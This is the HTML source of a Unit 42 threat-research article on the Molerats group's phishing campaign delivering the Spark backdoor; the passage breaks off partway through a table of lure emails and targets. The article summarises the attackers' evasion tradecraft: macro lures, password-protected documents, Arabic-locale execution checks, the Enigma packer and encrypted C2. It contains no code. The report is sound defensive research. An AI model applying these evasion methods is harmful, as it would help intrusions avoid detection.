<meta name="msapplication-TileImage" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" />
<script>var $ = jQuery;</script>

    <script type="text/javascript">
    ;(function(win, doc, style, timeout) {
    var STYLE_ID = 'at-body-style';
    function getParent() {
    return doc.getElementsByTagName('head')[0];
    }
    function addStyle(parent, id, def) {
        if (!parent) {
        return;
        }
        var style = doc.createElement('style');
        style.id = id;
        style.innerHTML = def;
        parent.appendChild(style);
    }
    function removeStyle(parent, id) {
        if (!parent) {
            return;
        }
        var style = doc.getElementById(id);
        if (!style) {
            return;
        }
        parent.removeChild(style);
    }
    addStyle(getParent(), STYLE_ID, style);
    setTimeout(function() {
    removeStyle(getParent(), STYLE_ID);
    }, timeout);
    }(window, document, "body {visibility:hidden !important}", 3000));
    </script>

            <script src="https://assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
            <script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>


<script type="text/javascript">
var isIE11 = !!navigator.userAgent.match(/Trident.*rv\:11\./);
if(isIE11){
    var polyfill = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/scripts/polyfill.min.js';
    document.write('<script type="text/javascript" src="'+polyfill+'">\x3C/script>');
}
    /**
 * String.prototype.replaceAll() polyfill
 * https://gomakethings.com/how-to-replace-a-section-of-a-string-with-another-one-with-vanilla-js/
 * @author Chris Ferdinandi
 * @license MIT
 */
if (!String.prototype.replaceAll) {
	String.prototype.replaceAll = function(str, newStr){
		// If a regex pattern
		if (Object.prototype.toString.call(str).toLowerCase() === '[object regexp]') {
			return this.replace(str, newStr);
		}
		// If a string
		return this.replace(new RegExp(str, 'g'), newStr);
	};
}

    /*! lozad.js - v1.16.0 - 2020-09-06 */
!function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.lozad=e()}(this,function(){"use strict";
/**
   * Detect IE browser
   * @const {boolean}
   * @private
   */var g="undefined"!=typeof document&&document.documentMode,f={rootMargin:"0px",threshold:0,load:function(t){if("picture"===t.nodeName.toLowerCase()){var e=t.querySelector("img"),r=!1;null===e&&(e=document.createElement("img"),r=!0),g&&t.getAttribute("data-iesrc")&&(e.src=t.getAttribute("data-iesrc")),t.getAttribute("data-alt")&&(e.alt=t.getAttribute("data-alt")),r&&t.append(e)}if("video"===t.nodeName.toLowerCase()&&!t.getAttribute("data-src")&&t.children){for(var a=t.children,o=void 0,i=0;i<=a.length-1;i++)(o=a[i].getAttribute("data-src"))&&(a[i].src=o);t.load()}t.getAttribute("data-poster")&&(t.poster=t.getAttribute("data-poster")),t.getAttribute("data-src")&&(t.src=t.getAttribute("data-src")),t.getAttribute("data-srcset")&&t.setAttribute("srcset",t.getAttribute("data-srcset"));var n=",";if(t.getAttribute("data-background-delimiter")&&(n=t.getAttribute("data-background-delimiter")),t.getAttribute("data-background-image"))t.style.backgroundImage="url('"+t.getAttribute("data-background-image").split(n).join("'),url('")+"')";else if(t.getAttribute("data-background-image-set")){var d=t.getAttribute("data-background-image-set").split(n),u=d[0].substr(0,d[0].indexOf(" "))||d[0];// Substring before ... 1x
u=-1===u.indexOf("url(")?"url("+u+")":u,1===d.length?t.style.backgroundImage=u:t.setAttribute("style",(t.getAttribute("style")||"")+"background-image: "+u+"; background-image: -webkit-image-set("+d+"); background-image: image-set("+d+")")}t.getAttribute("data-toggle-class")&&t.classList.toggle(t.getAttribute("data-toggle-class"))},loaded:function(){}};function A(t){t.setAttribute("data-loaded",!0)}var m=function(t){return"true"===t.getAttribute("data-loaded")},v=function(t){var e=1<arguments.length&&void 0!==arguments[1]?arguments[1]:document;return t instanceof Element?[t]:t instanceof NodeList?t:e.querySelectorAll(t)};return function(){var r,a,o=0<arguments.length&&void 0!==arguments[0]?arguments[0]:".lozad",t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{},e=Object.assign({},f,t),i=e.root,n=e.rootMargin,d=e.threshold,u=e.load,g=e.loaded,s=void 0;"undefined"!=typeof window&&window.IntersectionObserver&&(s=new IntersectionObserver((r=u,a=g,function(t,e){t.forEach(function(t){(0<t.intersectionRatio||t.isIntersecting)&&(e.unobserve(t.target),m(t.target)||(r(t.target),A(t.target),a(t.target)))})}),{root:i,rootMargin:n,threshold:d}));for(var c,l=v(o,i),b=0;b<l.length;b++)(c=l[b]).getAttribute("data-placeholder-background")&&(c.style.background=c.getAttribute("data-placeholder-background"));return{observe:function(){for(var t=v(o,i),e=0;e<t.length;e++)m(t[e])||(s?s.observe(t[e]):(u(t[e]),A(t[e]),g(t[e])))},triggerLoad:function(t){m(t)||(u(t),A(t),g(t))},observer:s}}});

</script>

<!-- <script src="https://www.google.com/recaptcha/api.js"></script>  -->

<!--  End: Scripts Migrated From Unit42-v5 -->

</head>
<body class="post-template-default single single-post postid-105134 single-format-standard no-sidebar">
<header class="haeder py-15 position-relative z-index-2" style="display: none;">
  <div class="container px-sm-30 px-35">
    <div class="row">
        <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                        <a href="https://www.paloaltonetworks.com/">
                <img src="/wp-content/uploads/2021/07/PANW_Parent.png" width="140px" alt="Logo" />
            </a>
        </div>
      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/">
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/unit42-logo-white.svg" class="attachment-full size-full" alt="Unit42 Logo"  width="150" height="35"/>
        </a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search" aria-label="search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required aria-label="Inner Search">
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10"  style="display: none!important;">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-119884" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-119884"><a target="_blank" rel="noopener" href="https://www.paloaltonetworks.com/unit42">Security Consulting</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
<li id="menu-item-121229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-121229"><a href="https://start.paloaltonetworks.com/contact-unit42.html"><b style="color:#C84727">Under Attack?</b></a></li>
</ul>  </div>
</nav>
<div class="panClean pan-template-home" id="main-nav-menu-cont" style="display:none;">
    <div class="cleanHeader mainNavigationComp baseComponent parbase">
        <div class="productNav2021Component dark default" id="PAN_2021_NAV_ASYNC">
        </div>
  </div>
<div class="cleanTopHtml htmlComp baseComponent parbase"><div class="base-component-spacer spacer-none  "></div>
</div>
</div>
<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
	function getCookie(cname) {
	 	var name = cname + "=";
  		var decodedCookie = decodeURIComponent(document.cookie);
		var ca = decodedCookie.split(';');
  		for(var i = 0; i <ca.length; i++) {
    			var c = ca[i];
    			while (c.charAt(0) == ' ') {
     				 c = c.substring(1);
    			}
    			if (c.indexOf(name) == 0) {
    				 return c.substring(name.length, c.length);
    			}
  		}
  		return "";
	}

	var referer = "";//sessionStorage.container;
	var pcontainer = sessionStorage.getItem("container");
	var searchResultsPagePath = "";
	if(((pcontainer) && pcontainer.indexOf('Prisma')!=-1)){
	    referer = 'Prisma' ;
	}
        else if(((pcontainer) && pcontainer.indexOf('Cortex')!=-1)){
	    referer = 'Cortex' ;
	}
        else if(((pcontainer) && pcontainer.indexOf('Sase')!=-1)){
	    referer = 'Sase' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Unit')!=-1)){
	    referer = 'Unit' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Ngfw')!=-1)){
	    referer = 'Ngfw' ;
	}
        var fromRef = document.referrer;
        var nContainer = getCookie("navContainer");
        if(nContainer){//If user is coming from main site, we need to reset the container		
		if(fromRef  && fromRef.indexOf("prismacloud.io")!=-1){
                        referer = 'Prisma' ;
                        sessionStorage.setItem("container","Prisma");
                } else if(fromRef.indexOf("paloaltonetworks.com")!=-1 || fromRef.indexOf("paloaltonetworks.jp")!=-1 ){
                        if(nContainer.indexOf('Prisma') != -1){
                            referer = 'Prisma' ;
                            sessionStorage.setItem("container","Prisma");
                        }
                        if(nContainer.indexOf('Cortex') != -1){
                            referer = 'Cortex' ;
                            sessionStorage.setItem("container","Cortex");
                        }
			if(nContainer.indexOf('Sase') != -1){
                            referer = 'Sase' ;
                            sessionStorage.setItem("container","Sase");
                        }
			if(nContainer.indexOf('Unit') != -1){
                            referer = 'Unit' ;
                            sessionStorage.setItem("container","Unit");
                        }
			if(nContainer.indexOf('Ngfw') != -1){
                            referer = 'Ngfw' ;
                            sessionStorage.setItem("container","Ngfw");
                        }
			document.cookie = 'navContainer=; path=/; domain=.paloaltonetworks.com; expires=' + new Date(0).toUTCString();
		}
	}
if(referer != "Prisma" && referer != "Cortex" && referer != "Sase" && referer != "Unit" && referer != "Ngfw") {
    referer = 'Unit' ;
    sessionStorage.setItem("container","Unit");
}
function callMainSitePrismaNavHTML(){
    
    var referrer_domain = 'https://www.paloaltonetworks.com';
    sessionStorage.setItem("domain",referrer_domain);
    if(referer == 'Prisma'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/prismasearch";
        }
    if(referer == 'Cortex'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderCortex.cortexRenderer.html';	
        searchResultsPagePath = referrer_domain+"/search/cortexsearch";	
    }
    if(referer == 'Sase'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderSase.saseRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/sasesearch";
    }
    if(referer == 'Unit'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/unit-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/content/pan/en_US/search/unit42search";
		    }
    if(referer == 'Ngfw'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/ngfw-cdss-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/search/ngfwcdsssearch";
    }
    httpGet(menu_url,'menu_html');
    document.getElementById('main-nav-menu-cont').removeAttribute("style");
}
function addStyle(styles) {            
    /* Create style document */
    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) 
        css.styleSheet.cssText = styles;
    else 
        css.appendChild(document.createTextNode(styles));

    /* Append style to the tag name */
    document.getElementsByTagName("head")[0].appendChild(css);
}
function httpGet(theUrl,req_type) {
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
    } else {// code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            if(req_type == 'menu_html'){
            var nav_text = xmlhttp.responseText.replaceAll('https://static.cloud.coveo.com/searchui/v2.9159/js/CoveoJsSearch.Lazy.min.js', '');
            nav_text = nav_text.replaceAll('src="/', 'src="'+maindomain_lang+'/');
            nav_text = nav_text.replaceAll("'/content", "'"+maindomain_lang+"/content");
                        
            document.getElementById("PAN_2021_NAV_ASYNC").innerHTML = nav_text.replaceAll('href="/', 'href="'+maindomain_lang+'/');

            var lozad_back = document.getElementsByClassName('lozad-background');
            Array.prototype.forEach.call(lozad_back, function(el) {
            // Do stuff here
            var el_back_img_path = el.getAttribute('data-background-image');
            var first_pos = el_back_img_path.indexOf("'");
            var last_pos = el_back_img_path.indexOf("'",first_pos+1);
            el_back_img_path = el_back_img_path.substring(first_pos+1,last_pos);
            el.setAttribute("data-background-image",main_site_url+el_back_img_path);
            });
            }
            if(req_type == 'head_inline_css'){
            addStyle(xmlhttp.responseText);
            }
        }
    }
    xmlhttp.open("GET", theUrl, true );
    xmlhttp.send();    
}    
    
if(referer == 'Prisma' || referer == 'Cortex' || referer == 'Sase' || referer == 'Unit' || referer == 'Ngfw'){
    const article = document.querySelector('#PAN_2021_NAV_ASYNC');
    if(referer == 'Prisma'){
        article.dataset.type = 'prisma';
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    else if(referer == 'Cortex'){
        article.dataset.type = 'cortex';
    }
    else if(referer == 'Sase'){
        article.dataset.type = 'sase';
    }
    else if(referer == 'Unit'){
        article.dataset.type = 'unit';
    }
    else if(referer == 'Ngfw'){
        article.dataset.type = 'ngfw';
    }
    //set class to default
    if(referer == 'Unit' || referer == 'Ngfw'){
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    callMainSitePrismaNavHTML();        
}
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->



<main class="main">
    <section class="section section--article">
        <div class="pa article-banner" style="background-image:url('https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/04_Business_email_compromise_Category_1920x900.jpg')">
          <div class="l-container"> 
            <div class="l-breadcrumbs"> 
              <ul> <li> <a href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:breadcrumb:Threat Research">Threat Research Center</a></li><li><a href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" title="Threat Research" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:breadcrumb:Threat Research">Threat Research</a></li><li class="is-current"><a href="https://unit42.paloaltonetworks.com/category/malware/" role="link" title="Malware" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:breadcrumb:Malware">Malware</a></li> </ul>
            </div>            <div class="ab__title">
              <a class="card-category" href="https://unit42.paloaltonetworks.com/category/malware/" role="link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Malware"><span class="ab-title__pre">Malware</span></a> 
              <h1>Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations</h1>
              <div class="ab__video">
              <span class="duration"> 
                <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-clock.svg" alt="Clock Icon"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 28</span> <span class="rt-label rt-postfix"></span></span> min read              </span>
                              </div>          
              <div class="ab-lc__wrapper">
                <span class="ab-title__pre">Related Products</span><div class="ab__link-cards"><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/advanced-dns-security/" style="--card-color: #ffcb06" role="link" title="Advanced DNS Security" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Advanced DNS Security"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png" alt="Advanced DNS Security icon">Advanced DNS Security</a><a class="l-linkcard is-blue" href="https://unit42.paloaltonetworks.com/product-category/advanced-wildfire/" style="--card-color: #ffcb06" role="link" title="Advanced WildFire" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Advanced WildFire"><img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png" alt="Advanced WildFire icon">Advanced WildFire</a></div>              </div>
            </div>
          </div>
          <div class="ab__footer">
            <div class="l-container">
              <div class="ab__footer-wrapper">
                <ul class="ab__features" role="list">
                  <li role="listitem">
				 <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-profile-grey.svg" alt="Profile Icon">
					 <div class="ab__text"><span>By:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Robert Falcone" href="https://unit42.paloaltonetworks.com/author/robertfalcone/">Robert Falcone</a></li><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Bryan Lee" href="https://unit42.paloaltonetworks.com/author/bryanlee/">Bryan Lee</a></li><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Alex Hinchliffe" href="https://unit42.paloaltonetworks.com/author/alex-hinchliffe/">Alex Hinchliffe</a></li></ul></div></li>                  <li role="listitem">
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-calendar-grey.svg" alt="Published Icon">
			<div class="ab__text"><span>Published:</span>3 March, 2020 at 6:00 AM PST</div></li>					<li role="listitem"><img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-category.svg" alt="Tags Icon"><div class="ab__text"><span>Categories:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Malware" href="https://unit42.paloaltonetworks.com/category/malware/">Malware</a></li><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Threat Research" href="https://unit42.paloaltonetworks.com/category/threat-research/">Threat Research</a></li></ul></div>
		</li>                  <li role="listitem"><img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-tags-grey.svg" alt="Tags Icon"><div class="ab__text"><span>Tags:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Gaza Hacking Team" href="https://unit42.paloaltonetworks.com/tag/gaza-hacking-team/">Gaza Hacking Team</a></li><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:JhoneRAT" href="https://unit42.paloaltonetworks.com/tag/jhonerat/">JhoneRAT</a></li><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Macros" href="https://unit42.paloaltonetworks.com/tag/macros/">Macros</a></li><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:MoleRats" href="https://unit42.paloaltonetworks.com/tag/molerats/">MoleRats</a></li><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Spark" href="https://unit42.paloaltonetworks.com/tag/spark/">Spark</a></li><li><a data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:Spear Phishing" href="https://unit42.paloaltonetworks.com/tag/spear-phishing/">Spear Phishing</a></li></ul></div>
		</li>                </ul>
                <div class="ab__options">
                  <ul role="list">
                                        <li role="listitem"><a href="https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/?pdf=download&#038;lg=en&#038;_wpnonce=dcff69efdc" role="link" target="_blank"  title="Click here to download" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:pdfdownload"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-download.svg" alt="Download Icon"></a></li>
                    <li role="listitem"><a href="https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/?pdf=print&#038;lg=en&#038;_wpnonce=dcff69efdc" target="_blank" role="link" title="Click here to print" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:hero:pdfprint"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-print.svg" alt="Print Icon"></a></li>
                  </ul>
                  
	<div class="ab__share" id="shareDropdown" role="button" aria-expanded="false">
	<a href="#" role="link" title="Click here to share" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:share" class="">Share<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"></a><ul class="share-dropdown" role="menu">
				<li role="menuitem">
					<a href="#" class="copy-url" id="copyUrl" data-url="https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/" role="link" title="Copy link" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:share:link"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-share-link.svg" alt="Link Icon"></a>
				</li>
				<li role="menuitem">
					<a href="mailto:?subject=Molerats%20Delivers%20Spark%20Backdoor%20to%20Government%20and%20Telecommunications%20Organizations&#038;body=Check%20out%20this%20article%20https%3A%2F%2Funit42.paloaltonetworks.com%2Fmolerats-delivers-spark-backdoor%2F" role="link" title="Share in email" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:share:email"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-sms.svg" alt="Link Email"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmolerats-delivers-spark-backdoor%2F" target="_blank" role="link" title="Share in Facebook" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:share:facebook"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-fb-share.svg" alt="Facebook Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmolerats-delivers-spark-backdoor%2F&#038;title=Molerats%20Delivers%20Spark%20Backdoor%20to%20Government%20and%20Telecommunications%20Organizations" target="_blank" role="link" title="Share in LinkedIn" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:share:linkedin"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-linkedin-share.svg" alt="LinkedIn Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmolerats-delivers-spark-backdoor%2F&#038;text=Molerats%20Delivers%20Spark%20Backdoor%20to%20Government%20and%20Telecommunications%20Organizations" target="_blank" role="link" title="Share in Twitter" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:share:twitter"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-twitter-share.svg" alt="Twitter Icon"></a>
				</li>
				<li role="menuitem">
					<a href="//www.reddit.com/submit?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmolerats-delivers-spark-backdoor%2F" target="_blank" role="link" title="Share in Reddit" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:share:reddit"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-reddit-share.svg" alt="Reddit Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://mastodon.social/share?text=Molerats%20Delivers%20Spark%20Backdoor%20to%20Government%20and%20Telecommunications%20Organizations%20https%3A%2F%2Funit42.paloaltonetworks.com%2Fmolerats-delivers-spark-backdoor%2F" target="_blank" role="link" title="Share in Mastodon" data-page-track="true" data-page-track-value="molerats-delivers-spark-backdoor:share:mastodon"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-mastodon-share.svg" alt="Mastodon Icon"></a>
				</li>
	  </ul>
    </div>                </div>
              </div>
            </div>
          </div>
        </div>
      </section> 
    <section class="section blog-contents"> 
      <div class="pa blog-editor">
        <div class="l-container">
          <div class="be__wrapper">
            <div class="be__contents">
              <div class="be__contents-wrapper">
                <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/molerats-delivers-spark-backdoor/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><h2>Executive Summary</h2>
<p>Between October 2019 through the beginning of December 2019, Unit 42 observed multiple instances of phishing attacks likely related to a threat group known as Molerats (AKA Gaza Hackers Team and Gaza Cybergang) targeting eight organizations in six different countries in the government, telecommunications, insurance and retail industries, of which the latter two were quite peculiar. The targeting of insurance and retail organizations is peculiar as it does not fit with this threat groups prior target set. The email subject and attachment file names used in the attacks on these seemingly atypical targets were similar in theme as those used when attacking government organizations. The lack of industry or target specific social engineering themes likely lowers the chances of a successful compromise and further confuses our understanding of the purpose of attacking these organizations.</p>
<p>All of the attacks involved spear-phishing emails to deliver malicious documents that required the recipient to carry out some action. The social engineering techniques included lure images attempting to trick the user into enabling content to run a macro and even document contents that threaten to release compromising pictures to the media to coerce the user into clicking a link to download a malicious payload. The payload in a majority of these attacks was a backdoor called <a href="https://www.cybereason.com/blog/new-cyber-espionage-campaigns-targeting-palestinians-part-one">Spark</a>, which is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system.</p>
<p>The Spark backdoor has been used by Molerats since at least 2017 and is associated with the <a href="https://securelist.com/operation-parliament-who-is-doing-what/85237/">Operation Parliament</a> campaign, which is attributed to the Gaza Cybergang. The payload delivered in one of the attacks appears to be related to <a href="https://blog.talosintelligence.com/2020/01/jhonerat.html">JhoneRAT</a>, which may suggest the threat group has added another custom payload to their toolset.</p>
<p>Molerats has been in operation as far back as 2011 targeting government organizations around the world, largely been associated with attacks involving unauthorized access and sensitive data collection.They have been observed using a bevy of tactics and techniques, ranging from leveraging publicly available backdoor tools, such as PoisonIvy or XtremeRAT, to creating custom developed ones such as <a href="https://unit42.paloaltonetworks.com/unit42-targeted-attacks-middle-east-using-kasperagent-micropsia/">KASPERAGENT and MICROPSIA</a>. In the campaign that we tracked, this group primarily relied on social engineering and spear-phishing techniques for their initial infection vector, then multi-stage command-and-control (C2) servers for malware delivery.</p>
<p>Molerats used a variety of techniques to make detection and analysis difficult, such as password-protecting delivery documents, limiting the execution of the Spark payload to only run on systems with an Arabic keyboard and locale and the use of the commercial packer Enigma to obfuscate the payloads. The Spark C2 channel also attempts to evade detection, as the data in the HTTP POST requests and responses is encrypted using either 3DES or AES with randomly generated keys that appear to be unique for each payload.</p>
<h2>Starting Point</h2>
<p>In November 2019, Unit 42 was made aware of a single phishing email directed at a Saudi Arabian government organization. This attack involved a password-protected Microsoft Word document, which contained an embedded macro. The password for the document was provided to the victim in the body of the email. From the artifacts discovered in this attack, we were able to use our AutoFocus product to pivot to additional attacks and uncover what turned out to be an attack campaign by Molerats.</p>
<p>Using our AutoFocus tool, we were able to find several attacks sent from the actors starting on October 2 through December 9, 2019. The emails were sent to organizations in the government and telecommunications verticals and had a mixture of specific and generic email subjects and attachment filenames. We also saw sessions associated with this attack campaign involving two US-based organizations, one in the retail and the other in the insurance industry.</p>
<p>The files attached to these emails were all documents, with the majority being Word documents and one PDF document. Table 1 shows a list of the emails used in this attack campaign, including the details of the email and the country and industry of the targeted organization. In this blog, we will provide an analysis of three of the seven delivery documents listed in Table 1, as the four unique delivery documents with MOFA in their file names are extremely similar to each other. The last delivery document (‘Urgent.docx’) was the delivery document discussed in <a href="https://blog.talosintelligence.com/2020/01/jhonerat.html">Cisco Talos' research on a new payload called JhoneRAT</a>, which may suggest that this group also uses JhoneRAT in their attack campaigns in the region.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 12.1591%;"><strong>Date</strong></td>
<td style="width: 32.6136%;"><strong>Subject</strong></td>
<td style="width: 15.4545%;"><strong>Attachment </strong></td>
<td style="width: 16.3636%;"><strong>SHA256</strong></td>
<td style="width: 8.18182%;"><strong>Country</strong></td>
<td style="width: 13.75%;"><strong>Industry</strong></td>
</tr>
<tr>
<td style="width: 12.1591%;">10/2/2019</td>
<td style="width: 32.6136%;">MOFA reports 03-10-2019</td>
<td style="width: 15.4545%;">MOFA- 031019.doc</td>
<td style="width: 16.3636%;">d19104ef4f443e8..</td>
<td style="width: 8.18182%;">AE</td>
<td style="width: 13.75%;">Gov</td>
</tr>
<tr>
<td style="width: 12.1591%;">10/3/2019</td>
<td style="width: 32.6136%;">03-10-2019</td>
<td style="width: 15.4545%;">MOFA- 031019.doc</td>
<td style="width: 16.3636%;">d19104ef4f443e8..</td>
<td style="width: 8.18182%;">UK,ES</td>
<td style="width: 13.75%;">Gov</td>
</tr>
<tr>
<td style="width: 12.1591%;">10/5/2019</td>
<td style="width: 32.6136%;">06-10-2019</td>
<td style="width: 15.4545%;">MOFA- 061019.doc</td>
<td style="width: 16.3636%;">03be1d7e1071b01..</td>
<td style="width: 8.18182%;">AE</td>
<td style="width: 13.75%;">Gov</td>
</tr>
<tr>
<td style="width: 12.1591%;">10/10/2019</td>
<td style="width: 32.6136%;">MOFA Reports</td>
<td style="width: 15.4545%;">MOFA- 101019.doc</td>
<td style="width: 16.3636%;">011ba7f9b4c508f..</p>
<p>ddf938508618ff7..</td>
<td style="width: 8.18182%;">US</td>
<td style="width: 13.75%;">Insurance,Retail</td>
</tr>
<tr>
<td style="width: 12.1591%;">10/31/2019</td>
<td style="width: 32.6136%;">لعناية معاليكم - المرفق 31-10-2019</td>
<td style="width: 15.4545%;">attachment.doc</td>
<td style="width: 16.3636%;">eaf2ba0d78c0fda..</td>
